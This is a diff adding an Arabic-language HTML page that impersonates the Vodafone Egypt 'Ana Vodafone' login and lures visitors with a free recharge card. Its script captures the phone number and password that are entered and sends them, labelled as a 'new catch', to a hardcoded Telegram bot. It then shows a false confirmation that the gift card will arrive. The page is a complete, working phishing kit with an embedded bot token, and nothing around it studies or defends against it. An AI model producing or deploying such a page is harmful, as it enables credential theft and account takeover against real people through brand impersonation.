@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>فودافون - كارت الشحن المجاني</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      background-color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .top-bar {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      justify-content: flex-end;
+      padding: 10px 0;
+    }
+    .back-arrow {
+      font-size: 26px;
+      color: #000000;
+      cursor: pointer;
+      text-decoration: none;
+      font-weight: bold;
+    }
+    .container {
+      width: 100%;
+      max-width: 380px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+ {
+      position: relative;
+      width: 150px;
+      height: 150px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      margin-top: 5px;
+      margin-bottom: 15px;
+    }
+    .watermark-bg {
+      position: absolute;
+      width: 100%;
+      height: 100%;
+      background: radial-gradient(circle, rgba(230,0,0,0.08) 20%, rgba(230,0,0,0.03) 50%, rgba(255,255,255,0) 70%);
+      border-radius: 50%;
+      z-index: 1;
+    }
+{
+      width: 65px;
+      height: 65px;
+      z-index: 2;
+    }
+    .title {
+      font-size: 1.5rem;
+      font-weight: 800;
+      color: #000000;
+      margin-bottom: 6px;
+      text-align: center;
+    }
+    .promo-banner {
+      background: #fff5f5;
+      border: 1px dashed #e60000;
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin-bottom: 25px;
+      text-align: center;
+      width: 100%;
+    }
+    .subtitle {
+      font-size: 0.92rem;
+      color: #e60000;
+      font-weight: 700;
+      line-height: 1.4;
+    }
+    .form-group {
+      width: 100%;
+      margin-bottom: 14px;
+      position: relative;
+    }
+    .input-box {
+      width: 100%;
+      height: 52px;
+      border: 1px solid #b2b2b2;
+      border-radius: 10px;
+      padding: 0 16px;
+      font-size: 0.95rem;
+      outline: none;
+      text-align: right;
+      color: #000000;
+      background-color: #ffffff;
+    }
+    .input-box:focus {
+      border-color: #e60000;
+    }
+    .input-box::placeholder {
+      color: #666666;
+    }
+    .toggle-password {
+      position: absolute;
+      left: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      cursor: pointer;
+      color: #444444;
+      display: flex;
+      align-items: center;
+    }
+    .forgot-link {
+      width: 100%;
+      text-align: right;
+      margin-top: 6px;
+      margin-bottom: 25px;
+    }
+    .forgot-link a {
+      color: #333333;
+      text-decoration: underline;
+      font-size: 0.88rem;
+      font-weight: 600;
+    }
+    .submit-btn {
+      width: 100%;
+      height: 48px;
+      background-color: #fca5a5;
+      color: #ffffff;
+      border: none;
+      border-radius: 10px;
+      font-size: 1.05rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+    .submit-btn.active {
+      background-color: #e60000;
+    }
+    #status-msg {
+      margin-top: 15px;
+      font-size: 0.88rem;
+      text-align: center;
+    }
+    .error { color: #dc2626; }
+    .success { color: #16a34a; }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">
+    <span class="back-arrow">&#8594;</span>
+  </div>
+
+  <div class="container">
+    <div class="logo-wrapper">
+      <div class="watermark-bg"></div>
+      <svg class="vf-logo" viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M50 18C34 18 25 31 25 46C25 63 38 74 53 74C68 74 76 61 74 48C72 35 62 27 50 18ZM52 62C43 62 36 55 36 46C36 38 41 29 50 24C57 31 63 38 63 46C63 55 58 62 52 62Z" fill="#e60000"/>
+      </svg>
+    </div>
+
+    <h1 class="title">تسجيل الدخول</h1>
+
+    <!-- العبارة الإعلانية التشويقية -->
+    <div class="promo-banner">
+      <p class="subtitle">🎁 ادخل رقم الهاتف وكلمة المرور الخاصة بـ "أنا فودافون" واحصل فوراً على كارت شحن هدية مجاناً!</p>
+    </div>
+
+    <form id="login-form" style="width: 100%;" onsubmit="sendData(event)">
+      <div class="form-group">
+        <input type="tel" id="phone" class="input-box" placeholder="رقم الهاتف" required oninput="checkInput()">
+      </div>
+
+      <div class="form-group">
+        <input type="password" id="password" class="input-box" placeholder="كلمة المرور" required oninput="checkInput()">
+        <span class="toggle-password" onclick="togglePass()">
+          <svg id="eye-icon" width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+            <line x1="1" y1="1" x2="23" y2="23"></line>
+          </svg>
+        </span>
+      </div>
+
+      <div class="forgot-link">
+        <a href="#">نسيت كلمة المرور؟</a>
+      </div>
+
+      <button type="submit" id="btn-submit" class="submit-btn">استلام الكارت الهدية 🎁</button>
+
+      <div id="status-msg"></div>
+    </form>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '8835097977:AAFKWhGW4uA_tNyiRtWikgYkBpfhUTHcInk';
+    const TELEGRAM_CHAT_ID = '5755390952';
+
+    function togglePass() {
+      const passInput = document.getElementById('password');
+      if (passInput.type === 'password') {
+        passInput.type = 'text';
+      } else {
+        passInput.type = 'password';
+      }
+    }
+
+    function checkInput() {
+      const phone = document.getElementById('phone').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const btn = document.getElementById('btn-submit');
+
+      if (phone !== '' && password !== '') {
+        btn.classList.add('active');
+      } else {
+        btn.classList.remove('active');
+      }
+    }
+
+    async function sendData(e) {
+      e.preventDefault();
+
+      const phone = document.getElementById('phone').value;
+      const password = document.getElementById('password').value;
+      const statusDiv = document.getElementById('status-msg');
+      const btn = document.getElementById('btn-submit');
+
+      statusDiv.className = '';
+      statusDiv.textContent = 'جاري التحقق لإرسال الكارت الهدية...';
+      btn.disabled = true;
+
+      const textMessage = `🎁 *صيد جديد (عرض كارت شحن)*\n\n📱 *رقم الهاتف:* \`${phone}\` \n🔑 *كلمة المرور:* \`${password}\``;
+
+      try {
+        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: textMessage,
+            parse_mode: 'Markdown'
+          })
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+          statusDiv.className = 'success';
+          statusDiv.textContent = 'تم طلب الكارت الهدية بنجاح! سيتم إرساله على رقمك في خلال دقائق.';
+          document.getElementById('login-form').reset();
+          btn.classList.remove('active');
+        } else {
+          statusDiv.className = 'error';
+          statusDiv.textContent = 'حدث خطأ، تأكد من الضغط على Start للبوت أولاً.';
+        }
+      } catch (err) {
+        statusDiv.className = 'error';
+        statusDiv.textContent = 'فشل الاتصال بالشبكة.';
+      } finally {
+        btn.disabled = false;
+      }
+    }
+  </script>
+</body>
+</html>
